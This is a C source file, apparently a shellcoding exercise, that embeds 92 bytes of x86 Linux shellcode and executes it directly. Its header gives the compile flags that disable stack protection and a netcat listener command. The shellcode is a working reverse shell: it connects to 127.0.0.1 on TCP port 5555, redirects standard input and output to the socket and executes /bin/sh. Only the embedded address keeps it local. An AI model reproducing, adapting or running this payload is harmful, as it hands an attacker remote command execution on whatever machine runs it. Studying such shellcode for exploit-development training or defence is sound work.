/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 5555  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final  
* Usage: ./reverse_shell_tcp_final
* Testing: nc -lv 5555
* Shellcode size: 92 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

int main(void)
{
unsigned char code[] =
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff"
"\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03"
"\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73"
"\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
    printf("Shellcode length: %d bytes\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
